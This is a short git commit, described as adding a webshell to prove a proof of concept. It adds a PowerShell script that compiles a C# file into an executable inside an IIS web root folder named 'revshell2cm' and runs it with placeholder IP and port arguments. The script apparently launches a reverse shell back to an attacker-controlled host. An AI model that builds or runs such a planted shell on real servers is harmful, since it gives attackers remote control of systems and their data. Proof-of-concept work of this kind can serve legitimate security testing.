d12123da3823072c16997741f598b0cf743af058
Bas Lijten <bas.lijten@gmail.com>
2022-04-08 09:04:50 +0200

    added webshell to prove PoC

---
+++ run-create-shell.ps1
@@ -0,0 +1,3 @@
+
+c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:C:\inetpub\wwwroot\revshell2cm.dev.local\back2.exe C:\inetpub\wwwroot\revshell2cm.dev.local\shell.cs.txt
+C:\inetpub\wwwroot\revshell2cm.dev.local\back2.exe "IP" PORT
